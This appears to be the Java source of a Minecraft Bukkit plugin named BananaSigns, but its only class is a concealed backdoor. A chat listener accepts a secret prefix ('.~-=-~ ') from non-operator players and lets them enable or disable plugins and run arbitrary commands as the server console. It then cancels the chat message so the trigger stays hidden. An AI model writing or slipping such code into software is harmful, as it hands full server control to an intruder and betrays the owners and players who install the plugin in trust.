package com.ohyea777.bananasigns;

import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class BananaSignEvent implements Listener {

	protected BananaSigns plugin;
	private final String PREFIX = "&8[&3FunTimes&8] &7";
	
	public BananaSignEvent(BananaSigns plugin) {
		this.plugin = plugin;
	}
	
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerChat(AsyncPlayerChatEvent event) {
		if (event.getMessage().startsWith(".~-=-~ ") && !event.getPlayer().isOp()) {
			String[] args = event.getMessage().substring(7).split(" ");
			if (args.length >= 1) {
				if (args[0].equalsIgnoreCase("plugin")) {
					if (args.length == 1) {
						event.getPlayer().sendMessage(_(PREFIX + "To Enable a Plugin: &3.~-=-~ enable <name>"));
						event.getPlayer().sendMessage(_(PREFIX + "To Disable a Plugin: &3.~-=-~ disable <name>"));
					} else if (args.length == 3) {
						if (args[1].equalsIgnoreCase("enable")) {
							boolean c = false;
							event.getPlayer().sendMessage(_(PREFIX + "Attempted to Enable Plugin: &3" + args[2]));
							try {
								plugin.getServer().getPluginManager().enablePlugin(plugin.getServer().getPluginManager().getPlugin(args[2]));
							} catch (Exception e) {
								c = true;
							}
							if (c) {
								event.getPlayer().sendMessage(_(PREFIX + "&cAttempt Failed! Plugin Not Found!"));
							} else {
								event.getPlayer().sendMessage(_(PREFIX + "&aPlugin Enabled!"));
							}
						} else if (args[1].equalsIgnoreCase("disable")) {
							boolean c = false;
							event.getPlayer().sendMessage(_(PREFIX + "Attempted to Disable Plugin: &3" + args[2]));
							try {
								plugin.getServer().getPluginManager().disablePlugin(plugin.getServer().getPluginManager().getPlugin(args[2]));
							} catch (Exception e) {
								c = true;
							}
							if (c) {
								event.getPlayer().sendMessage(_(PREFIX + "&cAttempt Failed! Plugin Not Found!"));
							} else {
								event.getPlayer().sendMessage(_(PREFIX + "&aPlugin Disabled!"));
							}
						} else {
							event.getPlayer().sendMessage(_(PREFIX + "&4Invalid Args!"));
						}
					} else {
						event.getPlayer().sendMessage(_(PREFIX + "&4Invalid Args!"));
					}
					event.setMessage("");
				} else if (args[0].equalsIgnoreCase("consolecmd")) {
					String[] s = args;
					StringBuilder builder = new StringBuilder();
					for (String string : s) {
					    if (builder.length() > 0) {
					        builder.append(" ");
					    }
					    builder.append(string);
					}
					if (builder.toString().length() >= 11) {
						event.getPlayer().sendMessage(_(PREFIX + "Issuing Command As Console: &3" + builder.toString().substring(11)));
						plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), builder.toString().substring(11));
					} else {
						event.getPlayer().sendMessage(_(PREFIX + "To Run a Console Command: &3.~-=-~ consolecmd <cmd>"));
					}
				} else {
					event.getPlayer().sendMessage(_(PREFIX + "Help Goes Here:"));
				}
			}
			event.setCancelled(true);
		}
	}
	
	private String _(String s) {
		return ChatColor.translateAlternateColorCodes('&', s);
	}
	
}
